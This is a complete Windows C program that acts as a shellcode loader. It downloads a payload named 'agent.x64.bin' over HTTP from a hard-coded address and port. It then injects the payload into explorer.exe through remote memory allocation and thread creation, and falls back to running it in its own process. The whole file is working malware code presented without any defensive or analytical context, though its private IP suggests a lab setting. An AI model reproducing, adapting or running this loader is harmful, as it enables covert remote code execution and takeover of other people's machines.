#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment(lib, "wininet.lib")

const char* IP = "192.168.122.130";
const char* PORT = "8443";
const char* SHELLCODE_FILE = "agent.x64.bin";

// Find explorer.exe PID
DWORD FindExplorerPID() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    
    DWORD pid = 0;
    if (Process32First(snapshot, &entry)) {
        do {
            if (lstrcmpiA(entry.szExeFile, "explorer.exe") == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    
    CloseHandle(snapshot);
    return pid;
}

unsigned char* DownloadShellcode(const char* url, size_t* outSize) {
    HINTERNET hInternet, hConnect;
    unsigned char* buffer = NULL;
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    DWORD contentLength = 0;
    
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;
    
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    DWORD dwSize = sizeof(contentLength);
    HttpQueryInfoA(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                   &contentLength, &dwSize, NULL);
    
    if (contentLength > 0) {
        buffer = (unsigned char*)VirtualAlloc(NULL, contentLength, MEM_COMMIT, PAGE_READWRITE);
    } else {
        buffer = (unsigned char*)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    }
    
    if (!buffer) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    while (InternetReadFile(hConnect, buffer + totalRead, 4096, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
        if (contentLength == 0 && totalRead + 4096 > 4096) {
            unsigned char* newBuffer = (unsigned char*)VirtualAlloc(NULL, totalRead + 4096, MEM_COMMIT, PAGE_READWRITE);
            if (newBuffer) {
                memcpy(newBuffer, buffer, totalRead);
                VirtualFree(buffer, 0, MEM_RELEASE);
                buffer = newBuffer;
            }
        }
    }
    
    *outSize = totalRead;
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char url[512];
    size_t shellcodeSize = 0;
    unsigned char* shellcode = NULL;
    
    snprintf(url, sizeof(url), "http://%s:%s/%s", IP, PORT, SHELLCODE_FILE);
    
    shellcode = DownloadShellcode(url, &shellcodeSize);
    
    if (shellcode && shellcodeSize > 0) {
        // Find explorer.exe
        DWORD explorerPid = FindExplorerPID();
        
        if (explorerPid > 0) {
            // Inject into explorer.exe
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
            if (hProcess) {
                LPVOID allocMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (allocMem) {
                    WriteProcessMemory(hProcess, allocMem, shellcode, shellcodeSize, NULL);
                    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);
                }
                CloseHandle(hProcess);
            }
        } else {
            // Fallback: run in current process
            LPVOID execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (execMem) {
                memcpy(execMem, shellcode, shellcodeSize);
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
                Sleep(5000); // Give it time to migrate
            }
        }
        
        VirtualFree(shellcode, 0, MEM_RELEASE);
    }
    
    return 0;
}